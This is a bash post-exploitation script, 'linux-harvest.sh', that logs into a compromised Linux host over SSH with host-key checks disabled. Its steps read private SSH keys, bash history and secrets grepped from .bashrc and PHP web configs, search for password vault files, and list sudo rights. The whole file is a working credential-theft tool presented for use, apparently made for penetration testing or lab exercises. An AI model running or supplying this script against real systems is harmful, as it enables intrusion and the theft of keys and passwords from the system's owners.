#!/bin/bash
# linux-harvest.sh - Credential harvesting from compromised Linux target
# Usage: ./linux-harvest.sh <ssh_user@host> [password]

SSH_TARGET="$1"
PASS="$2"

if [ -z "$SSH_TARGET" ]; then
    echo "Usage: linux-harvest.sh <user@host> [password]"
    exit 1
fi

do_ssh() {
    if [ -n "$PASS" ]; then
        sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_TARGET" "$1" 2>/dev/null
    else
        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_TARGET" "$1" 2>/dev/null
    fi
}

echo "=== Linux Credential Harvest ==="
echo "Target: $SSH_TARGET"
echo ""

echo "[1] User info"
do_ssh 'id; whoami; hostname'

echo "[2] Home directory contents"
do_ssh 'ls -la ~/'

echo "[3] SSH keys"
do_ssh 'ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null | head -3; cat ~/.ssh/id_ed25519 2>/dev/null | head -3'

echo "[4] Bash history"
do_ssh 'cat ~/.bash_history 2>/dev/null | tail -20'

echo "[5] Config files"
do_ssh 'cat ~/.bashrc 2>/dev/null | grep -iE "pass|cred|key|secret|token|export"'

echo "[6] Encrypted blobs (pwsm, gpg, etc)"
do_ssh 'find ~/ -name "*pswm*" -o -name "*pwsm*" -o -name "*.enc" -o -name "*.gpg" -o -name "*.kdbx" 2>/dev/null'

echo "[7] Web configs (if in web dir)"
do_ssh 'cat /var/www/html/*.php 2>/dev/null | grep -iE "pass|user|db|cred|secret|config" | head -20'

echo "[8] Sudo access"
do_ssh 'sudo -l 2>/dev/null'

echo ""
echo "=== Done ==="
